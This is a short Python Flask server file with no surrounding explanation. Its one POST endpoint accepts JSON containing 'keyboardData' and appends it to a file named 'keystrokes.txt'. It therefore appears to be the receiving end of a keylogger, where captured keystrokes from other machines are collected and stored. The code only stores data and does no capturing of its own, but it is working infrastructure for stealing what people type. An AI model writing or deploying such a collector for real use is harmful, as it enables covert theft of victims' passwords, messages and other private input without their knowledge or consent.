from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_data():
    data = request.get_json()

    if data and 'keyboardData' in data:
        with open("keystrokes.txt", "a") as file:
            file.write(data['keyboardData'])
        return "Data received", 200
    else:
        return "Bad request", 400

if __name__ == '__main__':
    app.run()
